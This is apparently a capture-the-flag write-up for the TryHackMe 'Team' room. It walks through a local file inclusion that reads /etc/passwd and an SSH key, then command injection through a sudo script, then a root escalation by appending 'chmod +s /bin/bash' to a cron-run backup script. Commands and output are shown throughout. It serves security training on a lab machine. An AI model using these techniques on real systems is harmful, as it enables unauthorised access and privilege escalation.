Hello this is my first write up fot the room Team from THM -> https://tryhackme.com/room/teamcw . I hope you will like it. For any questions or whatever message u can find me on Twitter https://twitter.com/Vojtech1337 . 
We will start with adding host to the /etc/hosts file and after that we will do all ports nmap scan.
```
echo "\n10.10.162.244 team.thm" >> /etc/hosts

Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-05 06:13 EDT
Nmap scan report for 10.10.96.107 (10.10.96.107)
Host is up (0.069s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
|_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
We see that we have ftp open so lets try to login with anonymous and leave password blank. But we have noo success. Next comes the web page on port 80.

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/Tryhackme-Write-Ups/Team/images/team_web.png?raw=true)

It looks like a static page - nothing interesting there. Gobuster didn't find any directories but found one subdomain -dev.team.thm .
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     team.thm
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
2022/10/07 07:11:48 Starting gobuster in DNS enumeration mode
===============================================================
Found: dev.team.thm
===============================================================
2022/10/07 07:20:56 Finished
===============================================================

```
We need to add it to the /etc/hosts as well to acess it.
```
echo "\n10.10.162.244 dev.team.thm" >> /etc/hosts
```
Now let's see what is on this page.
![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/Tryhackme-Write-Ups/Team/images/dev_team_web.png?raw=true)

Only thing here is link when we click it it redirects us to dev.team.thm/script.php?page=teamshare.php . 
This URL with page parameter immediately looks vulnerable to LFI attack. The easiest way to start testing this vulnerability is putting 
/etc/passwd into the page parameter which is successful and we have valid vulnerability.
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
dale:x:1000:1000:anon,,,:/home/dale:/bin/bash
gyles:x:1001:1001::/home/gyles:/bin/bash
ftpuser:x:1002:1002::/home/ftpuser:/bin/sh
ftp:x:110:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
```
We can see that (judging by which users have /bin/bash shell) there are 3 users - gyles,dale and root.
Now to get most of it we'll spin up wfuzz to fuzz pages. I've used this wordlist with linux files - https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Linux
```
wfuzz -u http://dev.team.thm/script.php?page=FUZZ -w LFI-WordList-Linux --hw 0

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.team.thm/script.php?page=FUZZ
Total requests: 771

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
=====================================================================
					-------redacted---------
000000260:   200        78 L     339 W      2684 Ch     "/etc/sysctl.conf"
000000251:   200        169 L    447 W      5990 Ch     "/etc/ssh/sshd_config"
000000231:   200        66 L     412 W      2180 Ch     "/etc/security/time.conf"
000000222:   200        107 L    663 W      3636 Ch     "/etc/security/group.conf"
000000228:   200        74 L     499 W      2973 Ch     "/etc/security/pam_env.conf"
000000226:   200        29 L     217 W      1441 Ch     "/etc/security/namespace.conf"
000000230:   200        12 L     70 W       420 Ch      "/etc/security/sepermit.conf"                                                                   
```
It will return many files but the most important one is /etc/ssh/sshd_config which contains id_rsa key.

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/Tryhackme-Write-Ups/Team/images/lfi_sshkey.png?raw=true)

Now we only need to copy the key to the file(without the hashes on the left) and chmod 600 and then we can simply use ssh command 
to connect to the machine as dale.
```
└─# ssh dale@team.thm -i id_rsa
Last login: Mon Jan 18 10:51:32 2021
dale@TEAM:~$ id
uid=1000(dale) gid=1000(dale) groups=1000(dale),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare),1003(editors)
```

Starting privilege escalation, we do simple sudo -l to see which commands we can run as different users and look at what the script does.
![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/Tryhackme-Write-Ups/Team/images/ssh_sudo-l.png?raw=true)

If you don't know what any of these commands do u can use linux documentation. What read does here is putting out input into error
variable and then putting it straight into bash. This leads to command execution with simple /bin/bash.

```
dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: whatever
Enter 'date' to timestamp the file: /bin/bash
The Date is 
id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
python3 -c 'import pty;pty.spawn("/bin/bash")'
gyles@TEAM:~$ id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
```
Now we're user gyles. Let's look into gyles directory. There is a .bash_history file which we can read. If you look
closely through the file there is a /usr/local/bin/main_backup.sh file which belongs to the admin group and is owned by root. There is no cronjob that we can see but it's still worth the try. The easiest way to privesc from here is to change /bin/bash permissions so it runs with the owner's (root) permissions.

```
gyles@TEAM:/home/gyles$ echo "chmod +s /bin/bash" >> /usr/local/bin/main_backup.s
gyles@TEAM:/home/gyles$ cat /usr/local/bin/main_backup.sh
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
chmod +s /bin/bash
```
Now we wait a until the minute passes and do
```
gyles@TEAM:/home/gyles$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1113504 Apr  4  2018 /bin/bash
```
If you want to keep the permissions and escalate to the root user u need to run it with -p otherwise it won't keep the permissions.
```
gyles@TEAM:/home/gyles$ /bin/bash -p
bash-4.4# id
uid=1001(gyles) gid=1001(gyles) euid=0(root) egid=0(root) groups=0(root),1001(gyles),1003(editors),1004(admin)
bash-4.4# cat /root/root.txt
THM{fhqbz*******}
```
And we have successfully rooted this machine and got the root flag.
Thank you so much for reading this write up. If you have any suggestions, questions or just want to play CTFs with someone reach me out 
on Twitter or wherever else you can find me.

